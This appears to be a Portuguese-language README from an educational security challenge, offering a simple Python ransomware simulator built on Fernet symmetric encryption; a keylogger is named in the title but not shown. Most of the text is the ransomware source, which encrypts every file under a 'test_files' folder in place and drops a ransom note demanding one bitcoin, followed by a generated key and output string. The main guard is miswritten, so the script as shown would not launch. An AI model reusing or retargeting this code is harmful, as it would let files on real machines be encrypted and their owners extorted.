# Desafio-ransomware-keylogger-educacional
 Projeto basico de  desafio pratico de segurança e programação Python. O objetivo é demonstrar o conceito principal de criptografia simétrica utilizando a biblioteca de criptografia , para criar um simulador basico de ataque ransomware e keylogger

*Arquivo com código - ransomware.py:*

from cryptography.fernet import Fernet
import os

# Gerando uma chave de criptografia e salvar 

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

# Carregar a chave salva
def carregar_chave():
    return open("chave.key", "rb").read()

# Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

# Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz,_, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz,nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

# Mensagem de resgate
def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envia 1 bitcoin para o endereço X e envie o comprovante!\n")
        f.write("Depois disso, enviaremos a chave para você recuperar seus dados!\n")

# Execução principal
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransomware executado! Arquivos criptografados")

if _name=="main_":
    main()

*Hash criada pós execução do código*
Top_siFTF6CRF_4d7GLFGDf3BhOQSBMTbPx9gZvE3GxWo3U0N9YIhOBSDYQQjg==


*Chave de descriptografia gerada*
VjUZSc0d86L48clr27u2wZkUtFIWTglaqO4jEn6SnQQ=
